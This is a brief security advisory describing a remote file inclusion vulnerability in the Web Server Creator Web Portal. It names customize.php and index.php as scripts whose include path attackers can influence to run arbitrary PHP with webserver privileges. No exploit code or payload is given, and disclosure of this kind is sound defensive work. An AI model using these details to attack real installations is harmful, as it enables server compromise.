The Web Server Creator Web Portal is prone to an issue which may allow attackers to include arbitrary files from a remote server.

It is possible for remote attackers to influence the include path for the customize.php and index.php scripts. As a result, an attacker may cause an arbitrary PHP script to be included from an attacker-supplied source, which may result in execution of commands with the privileges of the webserver.
